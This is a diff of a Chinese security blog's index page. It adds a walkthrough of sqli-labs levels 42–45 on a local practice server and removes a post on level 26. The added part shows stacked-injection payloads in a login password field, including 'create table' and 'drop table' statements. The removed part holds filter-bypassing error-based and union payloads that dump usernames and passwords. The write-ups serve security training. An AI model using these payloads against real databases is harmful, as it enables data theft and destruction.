@@ -64,6 +64,61 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-42~45" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/22/sql-labs-Less-42~45/" class="article-date">
+  <time datetime="2021-02-22T08:10:00.000Z" itemprop="datePublished">2021-02-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/22/sql-labs-Less-42~45/">sql-labs-Less-42~45</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-42</h1>
+进入http://127.0.0.1/sql/Less-42/，这关乍一看和前面二十几关的二次注入很像，但其实并不是。
+我们打开源代码：
+
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/22/sql-labs-Less-42~45/1.png" alt="1"><br>看到它只对username进行了处理，对password没有，所以我们可以在password那里进行注入。<br>输入admin|admin’，发生报错，有报错回显信息，再输入admin|admin’#登录成功（如果没有输入username，就只会登录失败，没有报错回显）。<br>由上面可知可以用’进行注入，可以延时注入和报错注入，布尔盲注也可以。不能用联合注入，因为用union select 1,2,3后不知道输出位置在哪里。<br>admin|admin’;create table test like users#<br>在数据库中增加了一个新表</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/22/sql-labs-Less-42~45/2.png" alt="2"><br>admin|admin’;drop table test# </p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/22/sql-labs-Less-42~45/3.png" alt="3"><br>刚才的表没了。</p>
+<p>PS：按F12，打开查看器，按下图把红圈里的password改成test，这样输入password时就可以看见了。</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/22/sql-labs-Less-42~45/4.png" alt="4"></p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/22/sql-labs-Less-42~45/5.png" alt="5"></p>
+<h1>Less-43</h1>
+
+<p>和Less-42一样，只是注入字符改成’)。</p>
+<h1>Less-44</h1>
+
+<p>和Less-42一样，只是这关要盲注。</p>
+<h1>Less-45</h1>
+
+<p>和Less-44一样，只是注入字符改成’)。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/22/sql-labs-Less-42~45/" data-id="cklghg8dt00002wuxffko5xow" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-38~41" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/21/sql-labs-Less-38~41/" class="article-date">
@@ -104,7 +159,7 @@
 
 <p>1.堆叠注入<br>  注入时，用‘;’把多个语句分开，这样注入时就可以同时运行多个语句。和union操作符不同的是，union使用的语句类型是有限的。<br>详细：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5762905.html">https://www.cnblogs.com/lcamry/p/5762905.html</a></p>
 <p>2.增删查改语句</p>
-<p>1)增：insert into 表名（例1，例2，…….）values (v1,v2,…….);<br>    // insert into student(id,name,grade) values (1,’zhangshan’,98);<br>2)删：<br>删数据:<br>delete from 表名;<br>delete from 表名 where id=1;<br>    //delete from users where id=1;<br>删数据库：drop database 数据库名;<br>删除表：drop table 表名;<br>删除表中的列:alter table 表名 drop column 列名;<br>3)改：update 表名 set 字段=‘值’【where 条件】；<br>    // update users set username= ‘ABC’ where id=’1’;<br>4)查：select */字段列表 from 表名 【where 条件】;<br>    // select */username from users 【where id=’1’】; </p>
+<p>1)增：<br>增数据：insert into 表名（例1，例2，…….）values (v1,v2,…….);<br>      // insert into student(id,name,grade) values (1,’zhangshan’,98);<br>增数据库：create database 数据库名;<br>增除表：create table 表名;<br>2)删：<br>删数据:<br>delete from 表名 [where id=1];<br>    //delete from users where id=1;<br>删数据库：drop database 数据库名;<br>删除表：drop table 表名;<br>删除表中的列:alter table 表名 drop column 列名;<br>3)改：update 表名 set 字段=’值’ [where 条件]；<br>    // update users set username= ‘ABC’ where id=’1’;<br>4)查：select */字段列表 from 表名 [where 条件];<br>    // select */username from users [where id=’1’]; </p>
 
       
     </div>
@@ -462,53 +517,11 @@ https://www.cnblogs.com/lcamry/p/5762961.html
 
 
   
-    <article id="post-sql-labs-Less-26" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/16/sql-labs-Less-26/" class="article-date">
-  <time datetime="2021-02-16T08:23:37.000Z" itemprop="datePublished">2021-02-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/16/sql-labs-Less-26/">sql-labs-Less-26</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/%EF%BC%8C%E8%BE%93%E5%85%A5?id=1%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA,%E5%9C%A8%E8%BE%93%E5%85%A5&#39;,%E5%8F%91%E7%94%9F%E6%8A%A5%E9%94%99%EF%BC%8C%E4%BB%8E%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E4%B8%AD%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%87%BA%E6%98%AF%E7%94%A8&#39;%E6%B3%A8%E5%85%A5%E7%9A%84%EF%BC%8C%E5%9C%A8%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA&#39;%EF%BC%8C%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%EF%BC%8C%E8%AF%B4%E6%98%8E%E5%8F%AF%E4%BB%A5%E7%94%A8&#39;%E6%B3%A8%E5%85%A5%E3%80%82">http://127.0.0.1/sql/Less-26/，输入?id=1正常输出,在输入&#39;,发生报错，从报错信息中可以看出是用&#39;注入的，在输入一个&#39;，正常输出，说明可以用&#39;注入。</a><br>再输入‘ or ‘1’=’1’，正常输出，但是我们看到下面的提示：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/16/sql-labs-Less-26/1.png" alt="1"><br><code>1&#39;&#39;1&#39;=&#39;1</code>，发现‘or’和空格都被过滤了，查看源代码：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/16/sql-labs-Less-26/2.png" alt="2"><br>发现还对其他字符进行了过滤。</p>
-<p>1)(不考虑空格)因为报错了，所以我们可以用报错注入（也有在Apache环境下空格符无法正常转码（即不能使用空格）的原因）。</p>
-<p>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;">http://127.0.0.1/sql/Less-26/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,database())) || ‘<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;">http://127.0.0.1/sql/Less-26/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))))||’<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;">http://127.0.0.1/sql/Less-26/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’))))||’<br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;">http://127.0.0.1/sql/Less-26/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(select(group_concat(id))from(users))))||’<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;">http://127.0.0.1/sql/Less-26/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(select(concat_ws(0x7e,username,passwoorrd))from(users)where(id=1))))||’</p>
-<p>2)(考虑空格)联合注入（可以用%a0和%0d代替空格(不知道为什么我都不能用但网上的教程都能用)）<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0oorrder%a0by%a03;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0oorrder%a0by%a03;%00</a><br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,2,3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,2,3;%00</a><br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,database(),3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,database(),3;%00</a><br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00</a><br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00</a><br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),(select%a0group_concat(passwoorrd)%a0from%a0users);%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),(select%a0group_concat(passwoorrd)%a0from%a0users);%00</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/16/sql-labs-Less-26/" data-id="ckl83xxu80000bkuxbgoo4jpt" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -540,6 +553,10 @@ https://www.cnblogs.com/lcamry/p/5762961.html
       <ul>
         
           <li>
+            <a href="/2021/02/22/sql-labs-Less-42~45/">sql-labs-Less-42~45</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/21/sql-labs-Less-38~41/">sql-labs-Less-38~41</a>
           </li>
         
@@ -553,10 +570,6 @@ https://www.cnblogs.com/lcamry/p/5762961.html
         
           <li>
             <a href="/2021/02/20/sql-labs-Less-32~33-35/">sql-labs-Less-32~33-35</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/18/sql-labs-Less-29-31/">sql-labs-Less-29~31</a>
           </li>
         
       </ul>
